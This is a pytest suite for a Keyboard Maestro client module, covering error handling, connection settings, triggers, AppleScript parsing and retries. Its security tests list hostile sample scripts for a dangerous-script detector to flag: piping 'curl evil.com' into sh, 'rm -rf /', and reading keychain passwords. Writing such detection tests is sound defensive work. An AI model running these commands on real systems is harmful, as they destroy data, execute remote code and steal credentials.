"""
Comprehensive tests for KM client integration module.

Tests cover functional interfaces, error handling monads, connection management,
async operations, and security features with property-based testing.
"""

import subprocess
from unittest.mock import Mock, patch

import pytest
from hypothesis import given
from hypothesis import strategies as st
from src.core.types import Duration, GroupId, MacroId, MacroMoveResult, TriggerId
from src.integration.km_client import (
    ConnectionConfig,
    ConnectionMethod,
    Either,
    # Classes and types
    KMClient,
    KMError,
    TriggerDefinition,
    create_client_with_fallback,
    # Functions
    retry_with_backoff,
)


# Test data generators
@st.composite
def connection_config_strategy(draw):
    """Generate valid connection configurations."""
    method = draw(st.sampled_from(list(ConnectionMethod)))
    timeout = draw(st.floats(min_value=1.0, max_value=60.0))
    port = draw(st.integers(min_value=1024, max_value=65535))
    host = draw(
        st.text(min_size=1, max_size=50).filter(
            lambda x: "." not in x or len(x.split(".")) == 4
        )
    )
    retries = draw(st.integers(min_value=0, max_value=10))
    delay = draw(st.floats(min_value=0.1, max_value=5.0))

    return ConnectionConfig(
        method=method,
        timeout=Duration.from_seconds(timeout),
        web_api_port=port,
        web_api_host=host if "." not in host else "localhost",
        max_retries=retries,
        retry_delay=Duration.from_seconds(delay),
    )


@st.composite
def km_error_strategy(draw):
    """Generate valid KM errors."""
    error_codes = [
        "CONNECTION_ERROR",
        "EXECUTION_ERROR",
        "TIMEOUT_ERROR",
        "VALIDATION_ERROR",
        "NOT_FOUND_ERROR",
        "SECURITY_ERROR",
    ]
    code = draw(st.sampled_from(error_codes))
    message = draw(st.text(min_size=1, max_size=200))

    # Optional details and retry_after
    details = draw(
        st.one_of(st.none(), st.dictionaries(st.text(), st.text(), max_size=5))
    )
    retry_after = draw(
        st.one_of(
            st.none(),
            st.floats(min_value=0.1, max_value=10.0).map(Duration.from_seconds),
        )
    )

    return KMError(code=code, message=message, details=details, retry_after=retry_after)


@st.composite
def trigger_definition_strategy(draw):
    """Generate valid trigger definitions."""
    trigger_id = draw(st.text(min_size=1, max_size=50))
    macro_id = draw(st.text(min_size=1, max_size=50))

    # Mock trigger type for testing (avoid circular import)
    class MockTriggerType:
        def __init__(self, value):
            self.value = value

    trigger_types = ["hotkey", "application", "timer", "usb_device"]
    trigger_type = MockTriggerType(draw(st.sampled_from(trigger_types)))

    configuration = draw(
        st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.one_of(st.text(), st.integers(), st.booleans()),
            max_size=10,
        )
    )
    enabled = draw(st.booleans())

    return TriggerDefinition(
        trigger_id=TriggerId(trigger_id),
        macro_id=MacroId(macro_id),
        trigger_type=trigger_type,
        configuration=configuration,
        enabled=enabled,
    )


@st.composite
def applescript_output_strategy(draw):
    """Generate AppleScript record format outputs for testing."""
    num_records = draw(st.integers(min_value=1, max_value=5))
    records = []

    for _i in range(num_records):
        macro_id = draw(st.text(min_size=1, max_size=20))
        macro_name = draw(st.text(min_size=1, max_size=50))
        group_name = draw(st.text(min_size=1, max_size=30))
        enabled = draw(st.booleans())
        trigger_count = draw(st.integers(min_value=0, max_value=10))
        action_count = draw(st.integers(min_value=1, max_value=20))

        record = f'macroId:"{macro_id}", macroName:"{macro_name}", groupName:"{group_name}", enabled:{str(enabled).lower()}, triggerCount:{trigger_count}, actionCount:{action_count}'
        records.append(record)

    return ", ".join(records)


class TestEitherMonad:
    """Test Either monad functionality for error handling."""

    def test_either_left_creation(self):
        """Test Left (error) value creation."""
        error = "Test error"
        either = Either.left(error)

        assert either.is_left()
        assert not either.is_right()
        assert either.get_left() == error
        assert either.get_right() is None

    def test_either_right_creation(self):
        """Test Right (success) value creation."""
        value = "Test value"
        either = Either.right(value)

        assert either.is_right()
        assert not either.is_left()
        assert either.get_right() == value
        assert either.get_left() is None

    def test_either_map_on_right(self):
        """Test mapping function over Right value."""
        either = Either.right(5)
        result = either.map(lambda x: x * 2)

        assert result.is_right()
        assert result.get_right() == 10

    def test_either_map_on_left(self):
        """Test mapping function over Left value (should not apply)."""
        either = Either.left("error")
        result = either.map(lambda x: x * 2)

        assert result.is_left()
        assert result.get_left() == "error"

    def test_either_flat_map_on_right(self):
        """Test flat mapping on Right value."""
        either = Either.right(5)
        result = either.flat_map(lambda x: Either.right(x * 2))

        assert result.is_right()
        assert result.get_right() == 10

    def test_either_flat_map_on_left(self):
        """Test flat mapping on Left value (should not apply)."""
        either = Either.left("error")
        result = either.flat_map(lambda x: Either.right(x * 2))

        assert result.is_left()
        assert result.get_left() == "error"

    def test_either_get_or_else_right(self):
        """Test get_or_else with Right value."""
        either = Either.right("success")
        result = either.get_or_else("default")

        assert result == "success"

    def test_either_get_or_else_left(self):
        """Test get_or_else with Left value."""
        either = Either.left("error")
        result = either.get_or_else("default")

        assert result == "default"

    @given(st.integers(), st.text())
    def test_either_property_validation(self, value, error):
        """Property test for Either behavior."""
        # Right value properties
        right_either = Either.right(value)
        assert right_either.is_right()
        assert not right_either.is_left()
        assert right_either.get_right() == value
        assert right_either.get_left() is None
        assert right_either.get_or_else("default") == value

        # Left value properties
        left_either = Either.left(error)
        assert left_either.is_left()
        assert not left_either.is_right()
        assert left_either.get_left() == error
        assert left_either.get_right() is None
        assert left_either.get_or_else("default") == "default"


class TestKMError:
    """Test KM error types and creation."""

    def test_connection_error_creation(self):
        """Test connection error factory method."""
        message = "Connection failed"
        error = KMError.connection_error(message)

        assert error.code == "CONNECTION_ERROR"
        assert error.message == message
        assert error.details is None
        assert error.retry_after is None

    def test_execution_error_creation(self):
        """Test execution error factory method."""
        message = "Execution failed"
        details = {"command": "test", "exit_code": 1}
        error = KMError.execution_error(message, details)

        assert error.code == "EXECUTION_ERROR"
        assert error.message == message
        assert error.details == details
        assert error.retry_after is None

    def test_timeout_error_creation(self):
        """Test timeout error factory method."""
        timeout = Duration.from_seconds(30)
        error = KMError.timeout_error(timeout)

        assert error.code == "TIMEOUT_ERROR"
        assert "30" in error.message
        assert error.retry_after == Duration.from_seconds(1.0)

    def test_validation_error_creation(self):
        """Test validation error factory method."""
        message = "Invalid input"
        error = KMError.validation_error(message)

        assert error.code == "VALIDATION_ERROR"
        assert error.message == message
        assert error.retry_after is None

    def test_not_found_error_creation(self):
        """Test not found error factory method."""
        message = "Resource not found"
        error = KMError.not_found_error(message)

        assert error.code == "NOT_FOUND_ERROR"
        assert error.message == message

    def test_security_error_creation(self):
        """Test security error factory method."""
        message = "Access denied"
        error = KMError.security_error(message)

        assert error.code == "SECURITY_ERROR"
        assert error.message == message

    @given(km_error_strategy())
    def test_error_property_validation(self, error: KMError):
        """Property test for KM error behavior."""
        # All errors should have code and message
        assert isinstance(error.code, str)
        assert len(error.code) > 0
        assert isinstance(error.message, str)
        assert len(error.message) > 0

        # Optional fields should be properly typed
        if error.details is not None:
            assert isinstance(error.details, dict)
        if error.retry_after is not None:
            assert isinstance(error.retry_after, Duration)
            assert error.retry_after.total_seconds() > 0


class TestConnectionConfig:
    """Test connection configuration functionality."""

    def test_connection_config_defaults(self):
        """Test default connection configuration."""
        config = ConnectionConfig()

        assert config.method == ConnectionMethod.APPLESCRIPT
        assert config.timeout.total_seconds() == 30
        assert config.web_api_port == 4490
        assert config.web_api_host == "localhost"
        assert config.max_retries == 3
        assert config.retry_delay.total_seconds() == 0.5

    def test_connection_config_with_timeout(self):
        """Test creating config with different timeout."""
        original_config = ConnectionConfig()
        new_timeout = Duration.from_seconds(60)
        new_config = original_config.with_timeout(new_timeout)

        # Original should be unchanged
        assert original_config.timeout.total_seconds() == 30

        # New config should have updated timeout
        assert new_config.timeout == new_timeout
        assert new_config.method == original_config.method
        assert new_config.web_api_port == original_config.web_api_port

    def test_connection_config_with_method(self):
        """Test creating config with different connection method."""
        original_config = ConnectionConfig()
        new_method = ConnectionMethod.WEB_API
        new_config = original_config.with_method(new_method)

        # Original should be unchanged
        assert original_config.method == ConnectionMethod.APPLESCRIPT

        # New config should have updated method
        assert new_config.method == new_method
        assert new_config.timeout == original_config.timeout
        assert new_config.web_api_port == original_config.web_api_port

    @given(connection_config_strategy())
    def test_connection_config_property_validation(self, config: ConnectionConfig):
        """Property test for ConnectionConfig behavior."""
        # All configs should have valid properties
        assert isinstance(config.method, ConnectionMethod)
        assert isinstance(config.timeout, Duration)
        assert config.timeout.total_seconds() > 0
        assert isinstance(config.web_api_port, int)
        assert 1024 <= config.web_api_port <= 65535
        assert isinstance(config.web_api_host, str)
        assert len(config.web_api_host) > 0
        assert isinstance(config.max_retries, int)
        assert config.max_retries >= 0
        assert isinstance(config.retry_delay, Duration)
        assert config.retry_delay.total_seconds() > 0


class TestTriggerDefinition:
    """Test trigger definition functionality."""

    def test_trigger_definition_creation(self):
        """Test trigger definition creation."""
        trigger_id = TriggerId("test_trigger")
        macro_id = MacroId("test_macro")

        # Mock trigger type to avoid circular import
        class MockTriggerType:
            def __init__(self, value):
                self.value = value

        trigger_type = MockTriggerType("hotkey")
        configuration = {"key": "a", "modifiers": ["command"]}

        trigger_def = TriggerDefinition(
            trigger_id=trigger_id,
            macro_id=macro_id,
            trigger_type=trigger_type,
            configuration=configuration,
            enabled=True,
        )

        assert trigger_def.trigger_id == trigger_id
        assert trigger_def.macro_id == macro_id
        assert trigger_def.trigger_type == trigger_type
        assert trigger_def.configuration == configuration
        assert trigger_def.enabled

    def test_trigger_definition_to_dict(self):
        """Test trigger definition dictionary conversion."""
        trigger_id = TriggerId("test_trigger")
        macro_id = MacroId("test_macro")

        class MockTriggerType:
            def __init__(self, value):
                self.value = value

        trigger_type = MockTriggerType("application")
        configuration = {"application": "TextEdit", "event": "launches"}

        trigger_def = TriggerDefinition(
            trigger_id=trigger_id,
            macro_id=macro_id,
            trigger_type=trigger_type,
            configuration=configuration,
            enabled=False,
        )

        result_dict = trigger_def.to_dict()

        assert result_dict["trigger_id"] == trigger_id
        assert result_dict["macro_id"] == macro_id
        assert result_dict["trigger_type"] == "application"
        assert result_dict["configuration"] == configuration
        assert not result_dict["enabled"]

    @given(trigger_definition_strategy())
    def test_trigger_definition_property_validation(
        self, trigger_def: TriggerDefinition
    ):
        """Property test for TriggerDefinition behavior."""
        # All trigger definitions should have required fields
        assert isinstance(trigger_def.trigger_id, str)  # TriggerId is NewType of str
        assert len(trigger_def.trigger_id) > 0
        assert isinstance(trigger_def.macro_id, str)  # MacroId is NewType of str
        assert len(trigger_def.macro_id) > 0
        assert hasattr(trigger_def.trigger_type, "value")
        assert isinstance(trigger_def.configuration, dict)
        assert isinstance(trigger_def.enabled, bool)

        # to_dict should work correctly
        result_dict = trigger_def.to_dict()
        assert "trigger_id" in result_dict
        assert "macro_id" in result_dict
        assert "trigger_type" in result_dict
        assert "configuration" in result_dict
        assert "enabled" in result_dict


class TestKMClient:
    """Test KMClient functionality."""

    def test_km_client_creation(self):
        """Test KM client creation."""
        config = ConnectionConfig()
        client = KMClient(config)

        assert client.config == config
        assert client._config == config

    @patch("subprocess.run")
    def test_execute_macro_applescript_success(self, mock_run):
        """Test successful macro execution via AppleScript."""
        # Setup mock
        mock_run.return_value = Mock(
            returncode=0, stdout="Macro executed successfully", stderr=""
        )

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        result = client.execute_macro(MacroId("test_macro"))

        assert result.is_right()
        assert "success" in result.get_right()
        mock_run.assert_called_once()

    @patch("subprocess.run")
    def test_execute_macro_applescript_failure(self, mock_run):
        """Test failed macro execution via AppleScript."""
        # Setup mock
        mock_run.return_value = Mock(returncode=1, stdout="", stderr="Macro not found")

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        result = client.execute_macro(MacroId("nonexistent_macro"))

        assert result.is_left()
        assert "Macro not found" in result.get_left().message

    @patch("subprocess.run")
    def test_execute_macro_applescript_timeout(self, mock_run):
        """Test macro execution timeout via AppleScript."""
        # Setup mock to raise timeout
        mock_run.side_effect = subprocess.TimeoutExpired(["osascript"], 30)

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        result = client.execute_macro(MacroId("slow_macro"))

        assert result.is_left()
        assert result.get_left().code == "TIMEOUT_ERROR"

    @patch("subprocess.run")
    def test_check_connection_applescript(self, mock_run):
        """Test connection check via AppleScript."""
        # Setup mock for successful ping
        mock_run.return_value = Mock(returncode=0, stdout="true", stderr="")

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        result = client.check_connection()

        assert result.is_right()
        assert result.get_right()

    @patch("subprocess.run")
    def test_register_trigger_applescript(self, mock_run):
        """Test trigger registration via AppleScript."""
        # Setup mock
        mock_run.return_value = Mock(
            returncode=0, stdout="SUCCESS: Trigger registered", stderr=""
        )

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        # Mock trigger type
        class MockTriggerType:
            def __init__(self, value):
                self.value = value

        trigger_def = TriggerDefinition(
            trigger_id=TriggerId("test_trigger"),
            macro_id=MacroId("test_macro"),
            trigger_type=MockTriggerType("hotkey"),
            configuration={"key": "a", "modifiers": ["command"]},
        )

        result = client.register_trigger(trigger_def)

        assert result.is_right()
        assert result.get_right() == "test_trigger"

    @patch("subprocess.run")
    def test_unregister_trigger_applescript(self, mock_run):
        """Test trigger unregistration via AppleScript."""
        # Setup mock
        mock_run.return_value = Mock(
            returncode=0, stdout="SUCCESS: Trigger unregistered", stderr=""
        )

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        result = client.unregister_trigger(TriggerId("test_trigger"))

        assert result.is_right()
        assert result.get_right()

    def test_unsupported_connection_method(self):
        """Test unsupported connection method error."""

        # Create invalid method
        class UnsupportedMethod:
            pass

        config = ConnectionConfig()
        config = config.__class__(
            method=UnsupportedMethod(),
            timeout=config.timeout,
            web_api_port=config.web_api_port,
            web_api_host=config.web_api_host,
            max_retries=config.max_retries,
            retry_delay=config.retry_delay,
        )

        client = KMClient(config)
        result = client.execute_macro(MacroId("test"))

        assert result.is_left()
        assert "Unsupported method" in result.get_left().message


class TestKMClientAsync:
    """Test KMClient async functionality."""

    @pytest.mark.asyncio
    async def test_register_trigger_async_success(self):
        """Test successful async trigger registration."""
        config = ConnectionConfig()
        client = KMClient(config)

        # Mock the validation and sanitization methods
        with (
            patch.object(client, "_validate_trigger_definition") as mock_validate,
            patch.object(client, "_sanitize_trigger_data") as mock_sanitize,
            patch.object(client, "_build_trigger_script_safe") as mock_build,
            patch.object(client, "_execute_applescript_safe") as mock_execute,
        ):
            # Setup mocks for success path
            class MockTriggerType:
                def __init__(self, value):
                    self.value = value

            trigger_def = TriggerDefinition(
                trigger_id=TriggerId("test_trigger"),
                macro_id=MacroId("test_macro"),
                trigger_type=MockTriggerType("hotkey"),
                configuration={"key": "a"},
            )

            mock_validate.return_value = Either.right(trigger_def)
            mock_sanitize.return_value = Either.right({"key": "a"})
            mock_build.return_value = Either.right("mock applescript")
            mock_execute.return_value = Either.right("SUCCESS: Trigger registered")

            result = await client.register_trigger_async(trigger_def)

            assert result.is_right()
            assert result.get_right() == "test_trigger"

    @pytest.mark.asyncio
    async def test_register_trigger_async_validation_failure(self):
        """Test async trigger registration with validation failure."""
        config = ConnectionConfig()
        client = KMClient(config)

        with patch.object(client, "_validate_trigger_definition") as mock_validate:
            mock_validate.return_value = Either.left(
                KMError.validation_error("Invalid trigger")
            )

            class MockTriggerType:
                def __init__(self, value):
                    self.value = value

            trigger_def = TriggerDefinition(
                trigger_id=TriggerId(""),  # Invalid empty ID
                macro_id=MacroId("test_macro"),
                trigger_type=MockTriggerType("hotkey"),
                configuration={},
            )

            result = await client.register_trigger_async(trigger_def)

            assert result.is_left()
            assert "Invalid trigger" in result.get_left().message

    @pytest.mark.asyncio
    async def test_list_macros_async_applescript(self):
        """Test async macro listing via AppleScript."""
        config = ConnectionConfig()
        client = KMClient(config)

        # Mock the AppleScript execution
        with patch.object(client, "_list_macros_applescript") as mock_applescript:
            mock_applescript.return_value = Either.right(
                [
                    {"id": "macro1", "name": "Test Macro 1", "group": "Group1"},
                    {"id": "macro2", "name": "Test Macro 2", "group": "Group2"},
                ]
            )

            result = await client.list_macros_async()

            assert result.is_right()
            macros = result.get_right()
            assert len(macros) == 2
            assert macros[0]["name"] == "Test Macro 1"

    @pytest.mark.asyncio
    async def test_list_macros_async_fallback_to_web_api(self):
        """Test async macro listing fallback to web API."""
        config = ConnectionConfig()
        client = KMClient(config)

        # Mock AppleScript failure and Web API success
        with (
            patch.object(client, "_list_macros_applescript") as mock_applescript,
            patch.object(client, "_list_macros_web_api") as mock_web_api,
        ):
            mock_applescript.return_value = Either.left(
                KMError.connection_error("AppleScript failed")
            )
            mock_web_api.return_value = Either.right(
                [{"id": "macro1", "name": "Web API Macro", "group": "Web Group"}]
            )

            result = await client.list_macros_async()

            assert result.is_right()
            macros = result.get_right()
            assert len(macros) == 1
            assert macros[0]["name"] == "Web API Macro"

    @pytest.mark.asyncio
    async def test_move_macro_to_group_async_success(self):
        """Test successful async macro movement."""
        config = ConnectionConfig()
        client = KMClient(config)

        macro_id = MacroId("test_macro")
        target_group = GroupId("target_group")

        # Mock all the movement steps
        with (
            patch.object(client, "_validate_move_operation") as mock_validate,
            patch.object(client, "_check_move_conflicts") as mock_conflicts,
            patch.object(client, "_execute_macro_move") as mock_move,
            patch.object(client, "_verify_move_success") as mock_verify,
        ):
            # Setup successful mock chain
            source_group = GroupId("source_group")
            macro_info = {"name": "Test Macro", "enabled": True}

            mock_validate.return_value = Either.right((source_group, macro_info))
            mock_conflicts.return_value = Either.right([])  # No conflicts
            mock_move.return_value = Either.right(True)
            mock_verify.return_value = Either.right(True)

            result = await client.move_macro_to_group_async(macro_id, target_group)

            assert result.is_right()
            move_result = result.get_right()
            assert isinstance(move_result, MacroMoveResult)
            assert move_result.macro_id == macro_id
            assert move_result.source_group == source_group
            assert move_result.target_group == target_group
            assert move_result.was_successful()

    @pytest.mark.asyncio
    async def test_move_macro_to_group_async_validation_failure(self):
        """Test async macro movement with validation failure."""
        config = ConnectionConfig()
        client = KMClient(config)

        with patch.object(client, "_validate_move_operation") as mock_validate:
            mock_validate.return_value = Either.left(
                KMError.not_found_error("Macro not found")
            )

            result = await client.move_macro_to_group_async(
                MacroId("nonexistent"), GroupId("target")
            )

            assert result.is_left()
            assert "Macro not found" in result.get_left().message


class TestKMClientAppleScriptParsing:
    """Test AppleScript parsing functionality."""

    def test_parse_applescript_records_single(self):
        """Test parsing single AppleScript record."""
        config = ConnectionConfig()
        client = KMClient(config)

        applescript_output = 'macroId:"test123", macroName:"Test Macro", groupName:"Test Group", enabled:true, triggerCount:2, actionCount:5'

        result = client._parse_applescript_records(applescript_output)

        assert len(result) == 1
        record = result[0]
        assert record["macroId"] == "test123"
        assert record["macroName"] == "Test Macro"
        assert record["groupName"] == "Test Group"
        assert record["enabled"]
        assert record["triggerCount"] == 2
        assert record["actionCount"] == 5

    def test_parse_applescript_records_multiple(self):
        """Test parsing multiple AppleScript records."""
        config = ConnectionConfig()
        client = KMClient(config)

        applescript_output = """macroId:"macro1", macroName:"First Macro", groupName:"Group1", enabled:true, triggerCount:1, actionCount:3, macroId:"macro2", macroName:"Second Macro", groupName:"Group2", enabled:false, triggerCount:0, actionCount:2"""

        result = client._parse_applescript_records(applescript_output)

        assert len(result) == 2

        # First record
        assert result[0]["macroId"] == "macro1"
        assert result[0]["macroName"] == "First Macro"
        assert result[0]["enabled"]

        # Second record
        assert result[1]["macroId"] == "macro2"
        assert result[1]["macroName"] == "Second Macro"
        assert not result[1]["enabled"]

    def test_parse_applescript_records_with_quotes(self):
        """Test parsing records with quoted values."""
        config = ConnectionConfig()
        client = KMClient(config)

        applescript_output = 'macroId:"test-123", macroName:"Macro with "quotes"", groupName:"Group", enabled:true, triggerCount:1, actionCount:1'

        result = client._parse_applescript_records(applescript_output)

        assert len(result) == 1
        record = result[0]
        assert record["macroId"] == "test-123"
        assert record["macroName"] == 'Macro with "quotes"'

    @given(applescript_output_strategy())
    def test_parse_applescript_records_property_validation(
        self, applescript_output: str
    ):
        """Property test for AppleScript record parsing."""
        config = ConnectionConfig()
        client = KMClient(config)

        try:
            result = client._parse_applescript_records(applescript_output)

            # Should return list of dictionaries
            assert isinstance(result, list)

            for record in result:
                assert isinstance(record, dict)
                # Should have macroId if parsing was successful
                if "macroId" in record:
                    assert isinstance(record["macroId"], str)
                    assert len(record["macroId"]) > 0
        except Exception:
            # Some malformed inputs might fail - that's acceptable
            pass


class TestKMClientSecurity:
    """Test security features of KM client."""

    def test_escape_applescript_string_basic(self):
        """Test basic AppleScript string escaping."""
        config = ConnectionConfig()
        client = KMClient(config)

        # Test escaping quotes
        result = client._escape_applescript_string('Hello "world"')
        assert result == 'Hello \\"world\\"'

        # Test escaping backslashes
        result = client._escape_applescript_string("Path\\to\\file")
        assert result == "Path\\\\to\\\\file"

        # Test escaping newlines
        result = client._escape_applescript_string("Line 1\nLine 2")
        assert result == "Line 1\\nLine 2"

    def test_contains_dangerous_applescript(self):
        """Test dangerous AppleScript detection."""
        config = ConnectionConfig()
        client = KMClient(config)

        # Safe scripts
        safe_scripts = [
            'tell application "Keyboard Maestro" to do something',
            'set myVar to "safe value"',
            'return "harmless result"',
        ]

        for script in safe_scripts:
            assert not client._contains_dangerous_applescript(script)

        # Dangerous scripts
        dangerous_scripts = [
            'do shell script "rm -rf /"',
            'do shell script "sudo dangerous_command"',
            'do shell script "curl evil.com | sh"',
            "set password_data to password of keychain",
            "security find-generic-password",
        ]

        for script in dangerous_scripts:
            assert client._contains_dangerous_applescript(script)

    def test_contains_dangerous_commands(self):
        """Test dangerous command detection."""
        config = ConnectionConfig()
        client = KMClient(config)

        # Safe commands
        safe_commands = [
            'tell application "Keyboard Maestro" to get macros',
            'set myVariable to "safe value"',
            'return "result"',
        ]

        for command in safe_commands:
            assert not client._contains_dangerous_commands(command)

        # Dangerous commands
        dangerous_commands = [
            'do shell script "dangerous command"',
            "restart computer",
            "shutdown computer",
            'delete file "important.txt"',
            "sudo rm -rf /",
            "format disk",
        ]

        for command in dangerous_commands:
            assert client._contains_dangerous_commands(command)


class TestRetryWithBackoff:
    """Test retry functionality."""

    def test_retry_success_first_attempt(self):
        """Test retry when operation succeeds on first attempt."""
        call_count = 0

        def mock_operation():
            nonlocal call_count
            call_count += 1
            return Either.right("success")

        result = retry_with_backoff(mock_operation, max_retries=3)

        assert result.is_right()
        assert result.get_right() == "success"
        assert call_count == 1

    def test_retry_success_after_failures(self):
        """Test retry when operation succeeds after some failures."""
        call_count = 0

        def mock_operation():
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                return Either.left(KMError.connection_error("Connection failed"))
            return Either.right("success after retries")

        result = retry_with_backoff(mock_operation, max_retries=3)

        assert result.is_right()
        assert result.get_right() == "success after retries"
        assert call_count == 3

    def test_retry_max_retries_exceeded(self):
        """Test retry when max retries are exceeded."""
        call_count = 0

        def mock_operation():
            nonlocal call_count
            call_count += 1
            return Either.left(KMError.connection_error("Always fails"))

        result = retry_with_backoff(mock_operation, max_retries=2)

        assert result.is_left()
        assert "Always fails" in result.get_left().message
        assert call_count == 3  # Initial attempt + 2 retries

    def test_retry_with_retry_after(self):
        """Test retry respects retry_after from error."""
        call_count = 0

        def mock_operation():
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                return Either.left(KMError.timeout_error(Duration.from_seconds(30)))
            return Either.right("success")

        # Mock time.sleep to avoid actual delays in tests
        with patch("time.sleep") as mock_sleep:
            result = retry_with_backoff(mock_operation, max_retries=1)

            assert result.is_right()
            assert call_count == 2
            mock_sleep.assert_called_once()


class TestFallbackClient:
    """Test fallback client functionality."""

    @patch("subprocess.run")
    def test_fallback_client_primary_success(self, mock_run):
        """Test fallback client when primary method succeeds."""
        # Setup primary method to succeed
        mock_run.return_value = Mock(returncode=0, stdout="Primary success", stderr="")

        primary_config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        fallback_config = ConnectionConfig(method=ConnectionMethod.URL_SCHEME)

        client = create_client_with_fallback(primary_config, fallback_config)
        result = client.execute_macro(MacroId("test_macro"))

        assert result.is_right()
        assert "success" in result.get_right()

    @patch("subprocess.run")
    def test_fallback_client_primary_failure_fallback_success(self, mock_run):
        """Test fallback client when primary fails but fallback succeeds."""
        call_count = 0

        def mock_run_side_effect(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                # Primary method fails
                return Mock(returncode=1, stdout="", stderr="Primary failed")
            else:
                # Fallback method succeeds
                return Mock(returncode=0, stdout="Fallback success", stderr="")

        mock_run.side_effect = mock_run_side_effect

        primary_config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        fallback_config = ConnectionConfig(method=ConnectionMethod.URL_SCHEME)

        client = create_client_with_fallback(primary_config, fallback_config)
        result = client.execute_macro(MacroId("test_macro"))

        assert result.is_right()
        assert call_count == 2  # Both primary and fallback called


class TestIntegration:
    """Integration tests for complete workflows."""

    @patch("subprocess.run")
    def test_complete_macro_execution_workflow(self, mock_run):
        """Test complete macro execution workflow."""
        # Setup successful macro execution
        mock_run.return_value = Mock(
            returncode=0, stdout="Macro executed successfully with output", stderr=""
        )

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        # Execute macro
        result = client.execute_macro(
            MacroId("integration_test_macro"), "test_parameter"
        )

        assert result.is_right()
        response = result.get_right()
        assert response["success"]
        assert "Macro executed successfully" in response["output"]

    @patch("subprocess.run")
    def test_complete_trigger_management_workflow(self, mock_run):
        """Test complete trigger management workflow."""
        # Setup successful trigger operations
        responses = [
            Mock(
                returncode=0, stdout="SUCCESS: Trigger registered", stderr=""
            ),  # Register
            Mock(
                returncode=0, stdout="SUCCESS: Trigger activated", stderr=""
            ),  # Activate
            Mock(
                returncode=0, stdout="SUCCESS: Trigger unregistered", stderr=""
            ),  # Unregister
        ]
        mock_run.side_effect = responses

        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        client = KMClient(config)

        # Mock trigger type
        class MockTriggerType:
            def __init__(self, value):
                self.value = value

        trigger_def = TriggerDefinition(
            trigger_id=TriggerId("workflow_trigger"),
            macro_id=MacroId("workflow_macro"),
            trigger_type=MockTriggerType("hotkey"),
            configuration={"key": "w", "modifiers": ["command", "shift"]},
        )

        # Register trigger
        register_result = client.register_trigger(trigger_def)
        assert register_result.is_right()

        # Activate trigger
        activate_result = client.activate_trigger(trigger_def.trigger_id)
        assert activate_result.is_right()

        # Unregister trigger
        unregister_result = client.unregister_trigger(trigger_def.trigger_id)
        assert unregister_result.is_right()

        # Verify all calls were made
        assert mock_run.call_count == 3

    def test_error_propagation_workflow(self):
        """Test error propagation through workflow."""
        config = ConnectionConfig(method=ConnectionMethod.APPLESCRIPT)
        KMClient(config)

        # Test with invalid connection method
        invalid_config = ConnectionConfig()
        invalid_config = invalid_config.__class__(
            method="invalid_method",  # Invalid method
            timeout=config.timeout,
            web_api_port=config.web_api_port,
            web_api_host=config.web_api_host,
            max_retries=config.max_retries,
            retry_delay=config.retry_delay,
        )

        invalid_client = KMClient(invalid_config)
        result = invalid_client.execute_macro(MacroId("test"))

        assert result.is_left()
        error = result.get_left()
        assert isinstance(error, KMError)
        assert "Unsupported method" in error.message
